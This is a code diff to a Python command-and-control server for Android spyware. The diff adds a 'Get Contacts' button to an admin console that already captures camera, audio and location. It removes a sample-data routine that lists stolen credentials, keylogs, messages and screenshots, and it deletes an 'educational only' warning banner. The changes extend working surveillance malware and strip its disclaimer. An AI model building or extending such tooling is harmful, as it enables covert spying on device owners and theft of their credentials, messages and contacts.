@@ -680,6 +680,8 @@ class WebAdminConsole:
                                                     <button onclick="sendCommand('${device.device_id}', 'capture_camera')">Capture Camera</button>
                                                     <button onclick="sendCommand('${device.device_id}', 'record_audio')">Record Audio</button>
                                                     <button onclick="sendCommand('${device.device_id}', 'get_location')">Get Location</button>
+                                                    <button onclick="sendCommand('${device.device_id}', 'get_contacts')">Get Contacts</button>
+
                                                 </div>
                                             </div>
                                         `;
@@ -859,56 +861,6 @@ def generate_self_signed_cert(cert_file="server.crt", key_file="server.key"):
         raise Exception("Failed to generate certificate: cryptography module not available")
 
 
-def create_sample_data():
-    """Create sample data files for testing"""
-    # Sample device info
-    sample_device = {
-        "device_id": "sample_device_001",
-        "device_info": {
-            "model": "Sample Phone",
-            "manufacturer": "Android",
-            "android_version": "12"
-        },
-        "registration_time": datetime.datetime.now().isoformat(),
-        "last_seen": datetime.datetime.now().isoformat()
-    }
-    
-    # Create devices directory and save sample device
-    devices_dir = os.path.join(DATA_DIR, "devices")
-    os.makedirs(devices_dir, exist_ok=True)
-    with open(os.path.join(devices_dir, "sample_device_001.json"), 'w') as f:
-        json.dump(sample_device, f, indent=2)
-    
-    # Create sample data for each data type
-    data_types = {
-        "credentials": {"username": "user@example.com", "password": "password123", "app": "SampleApp"},
-        "keylog": {"text": "Sample keylog data", "app": "SampleApp"},
-        "location": {"latitude": 37.7749, "longitude": -122.4194, "accuracy": 10.0},
-        "contacts": {"name": "John Doe", "phone": "+1234567890", "email": "john@example.com"},
-        "messages": {"from": "Alice", "to": "Bob", "content": "Hello, how are you?"},
-        "screenshots": {"timestamp": datetime.datetime.now().isoformat(), "description": "Sample screenshot"}
-    }
-    
-    # Save sample data files
-    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-    for data_type, sample_data in data_types.items():
-        data_dir = os.path.join(DATA_DIR, data_type)
-        os.makedirs(data_dir, exist_ok=True)
-        
-        # Add metadata to the sample data
-        full_data = {
-            "type": data_type,
-            "device_id": "sample_device_001",
-            "timestamp": timestamp,
-            "data": sample_data
-        }
-        
-        # Save to file
-        with open(os.path.join(data_dir, f"sample_{data_type}_{timestamp}.json"), 'w') as f:
-            json.dump(full_data, f, indent=2)
-    
-    logger.info("Created sample data files for testing")
-
 def run_c2_server(port, use_ssl=True, cert_file="server.crt", key_file="server.key"):
     """Run the C2 server"""
     # Create all required directories
@@ -931,9 +883,6 @@ def run_c2_server(port, use_ssl=True, cert_file="server.crt", key_file="server.k
         logger.info(f"Created directory: {type_dir}")
     
     logger.info(f"Created all data directories in {DATA_DIR}")
-    
-    # Create sample data for testing
-    create_sample_data()
     
     # Create HTTPS server
     httpd = HTTPServer(('0.0.0.0', port), C2RequestHandler)
@@ -977,17 +926,6 @@ if __name__ == "__main__":
     parser.add_argument("--key", type=str, default="server.key", help="SSL key file")
     
     args = parser.parse_args()
-    
-    # Print banner
-    print("""
-    ┌──────────────────────────────────────────┐
-    │   Android C2 Server - Educational Only   │
-    │                                          │
-    │ WARNING: FOR EDUCATIONAL PURPOSES ONLY   │
-    │                                          │
-    │ DO NOT USE FOR MALICIOUS PURPOSES        │
-    └──────────────────────────────────────────┘
-    """)
     
     # Run server
     run_c2_server(args.port, not args.no_ssl, args.cert, args.key)
